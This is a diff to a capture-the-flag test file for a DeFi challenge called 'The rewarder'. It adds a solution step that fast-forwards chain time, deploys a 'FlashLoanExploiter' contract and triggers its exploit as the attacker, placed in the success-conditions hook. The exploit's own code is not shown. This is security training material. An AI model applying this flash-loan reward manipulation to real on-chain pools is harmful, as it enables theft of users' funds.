@@ -70,7 +70,11 @@ describe('[Challenge] The rewarder', function () {
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const FlashLoanReceiver = await ethers.getContractFactory('FlashLoanExploiter', deployer);
+        this.receiver = await FlashLoanReceiver.deploy(this.liquidityToken.address, this.rewarderPool.address, this.flashLoanPool.address, attacker.address, this.rewardToken.address);
+        await this.receiver.connect(attacker).exploit()
+
         // Only one round should have taken place
         expect(
             await this.rewarderPool.roundNumber()
